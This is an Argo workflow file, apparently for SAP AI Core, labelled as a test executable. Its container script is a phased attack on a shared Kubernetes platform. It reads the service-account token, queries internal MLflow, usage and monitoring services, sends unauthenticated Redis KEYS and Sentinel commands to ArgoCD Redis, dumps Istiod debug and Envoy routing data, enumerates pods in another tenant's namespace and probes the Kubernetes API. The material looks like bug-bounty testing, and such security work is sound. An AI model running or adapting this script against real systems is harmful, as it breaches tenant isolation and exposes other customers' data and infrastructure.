apiVersion: argoproj.io/v1alpha1
kind: WorkflowTemplate
metadata:
  name: bb14-exec
  annotations:
    scenarios.ai.sap.com/description: "BB14 test workflow"
    scenarios.ai.sap.com/name: "bb14-scenario"
    executables.ai.sap.com/description: "BB14 test executable"
    executables.ai.sap.com/name: "bb14-exec"
  labels:
    scenarios.ai.sap.com/id: "bb14-scenario"
    executables.ai.sap.com/id: "bb14-exec"
    ai.sap.com/version: "30.0.0"
spec:
  entrypoint: main
  templates:
  - name: main
    metadata:
      labels:
        ai.sap.com/resourcePlan: starter
    container:
      image: nicolaka/netshoot:latest
      command:
      - bash
      - -c
      - |
        echo "=== V30 ENVOY-PROXIED SERVICE INTERACTION ==="
        echo "=== $(date -u) ==="

        # -------------------------------------------------------
        # PHASE 1: Use Envoy sidecar as mTLS proxy
        # The sidecar intercepts outbound traffic to known services
        # and automatically applies mTLS. Use service DNS names.
        # -------------------------------------------------------
        echo "=== PHASE1: SERVICE ACCESS VIA ENVOY SIDECAR ==="

        # MLflow - auth succeeded with JWT before, try via sidecar
        echo "[*] MLflow via sidecar (HTTP):"
        curl -sv --connect-timeout 5 "http://ml-tracking-service.ml-tracking.svc.cluster.local/api/2.0/mlflow/experiments/list" 2>&1 | tail -20
        echo ""

        # Try with our API JWT
        API_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo "no-sa-token")
        echo "[*] SA token available: $(echo $API_TOKEN | head -c 20)..."

        echo "[*] MLflow experiments list (via sidecar, no extra auth):"
        curl -s --connect-timeout 5 "http://ml-tracking-service.ml-tracking.svc.cluster.local/api/2.0/mlflow/experiments/list" 2>&1 | head -c 2000
        echo ""

        echo "[*] MLflow experiments search (via sidecar):"
        curl -s --connect-timeout 5 "http://ml-tracking-service.ml-tracking.svc.cluster.local/api/2.0/mlflow/experiments/search?max_results=100" 2>&1 | head -c 2000
        echo ""

        # Usage API
        echo "[*] Usage API via sidecar:"
        curl -s --connect-timeout 5 "http://usage-api-service.usage-api.svc.cluster.local/" 2>&1 | head -c 500
        echo ""

        # Dynatrace ActiveGate
        echo "[*] Dynatrace ActiveGate via sidecar:"
        curl -s --connect-timeout 5 "http://dynakube-activegate.dynatrace.svc.cluster.local/" 2>&1 | head -c 500
        echo ""

        # -------------------------------------------------------
        # PHASE 2: ArgoCD Redis - proper protocol
        # -------------------------------------------------------
        echo "=== PHASE2: ARGOCD REDIS DEEP PROBE ==="

        # Use the DNS-resolved IPs
        for REDIS_HOST in \
          "argocd-redis-ha.argocd-tenants.svc.cluster.local" \
          "argocd-redis-ha-announce-0.argocd-tenants.svc.cluster.local" \
          "100.64.54.30"; do
          echo "[*] Redis probe: ${REDIS_HOST}:6379"

          # Proper Redis protocol: *1\r\n$4\r\nPING\r\n
          printf '*1\r\n$4\r\nPING\r\n' | nc -w3 ${REDIS_HOST} 6379 2>&1
          echo " (ping)"

          # Try INFO
          printf '*1\r\n$4\r\nINFO\r\n' | nc -w3 ${REDIS_HOST} 6379 2>&1 | head -c 500
          echo " (info)"

          # Try without AUTH - KEYS *
          printf '*2\r\n$4\r\nKEYS\r\n$1\r\n*\r\n' | nc -w3 ${REDIS_HOST} 6379 2>&1 | head -c 500
          echo " (keys)"

          echo ""
        done

        # Sentinel port
        echo "[*] Redis Sentinel probe:"
        printf '*1\r\n$4\r\nPING\r\n' | nc -w3 argocd-redis-ha.argocd-tenants.svc.cluster.local 26379 2>&1
        echo " (sentinel ping)"
        printf '*2\r\n$8\r\nSENTINEL\r\n$7\r\nMASTERS\r\n' | nc -w3 argocd-redis-ha.argocd-tenants.svc.cluster.local 26379 2>&1 | head -c 500
        echo " (sentinel masters)"

        # -------------------------------------------------------
        # PHASE 3: Istiod via sidecar + different ports
        # -------------------------------------------------------
        echo "=== PHASE3: ISTIOD DEEP PROBE ==="
        echo "[*] Istiod via sidecar DNS:"
        curl -s --connect-timeout 3 "http://istiod.istio-system.svc.cluster.local:15014/debug/endpointz" 2>&1 | head -c 2000
        echo ""
        curl -s --connect-timeout 3 "http://istiod.istio-system.svc.cluster.local:15014/debug/registryz" 2>&1 | head -c 2000
        echo ""
        curl -s --connect-timeout 3 "http://istiod.istio-system.svc.cluster.local:15014/debug/syncz" 2>&1 | head -c 2000
        echo ""
        # Istiod monitoring port
        curl -s --connect-timeout 3 "http://istiod.istio-system.svc.cluster.local:15010/debug/endpointz" 2>&1 | head -c 1000
        echo ""
        # Istiod gRPC (xDS)
        curl -s --connect-timeout 3 "http://istiod.istio-system.svc.cluster.local:15012/" 2>&1 | head -c 500
        echo ""

        # -------------------------------------------------------
        # PHASE 4: Envoy detailed cluster + listener info
        # Which services does Envoy know how to reach?
        # -------------------------------------------------------
        echo "=== PHASE4: ENVOY SERVICE MAP ==="
        echo "[*] All outbound clusters (service routes):"
        curl -s http://localhost:15000/clusters 2>&1 | grep "^outbound" | grep -oE 'outbound\|[0-9]+\|[^:]+' | sort -u | head -40
        echo ""
        echo "[*] Listener ports:"
        curl -s http://localhost:15000/listeners 2>&1 | grep -oE '"name":"[^"]*"' | sort -u | head -30
        echo ""

        # -------------------------------------------------------
        # PHASE 5: Direct access to other tenant namespace
        # We know rg-4b258265-cd927cab exists (from KSM v27)
        # -------------------------------------------------------
        echo "=== PHASE5: CROSS-TENANT NAMESPACE PROBE ==="
        echo "[*] Pods in other tenant namespace (from KSM):"
        curl -s "http://ksm-pods-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics" 2>&1 | \
          grep "kube_pod_info" | grep "rg-4b258265" | head -10
        echo ""

        # Try to reach services in the other tenant namespace
        echo "[*] DNS for other tenant services:"
        nslookup "*.rg-4b258265-cd927cab.svc.cluster.local" 2>&1 | tail -5
        echo ""

        # K8s API server probe (last resort)
        echo "=== PHASE6: K8S API ==="
        echo "[*] K8s API at kubernetes.default:"
        curl -sk --connect-timeout 3 "https://kubernetes.default.svc.cluster.local/version" 2>&1 | head -c 300
        echo ""
        curl -sk --connect-timeout 3 "https://kubernetes.default.svc.cluster.local/api" 2>&1 | head -c 300
        echo ""

        echo "=== V30 DONE $(date -u) ==="
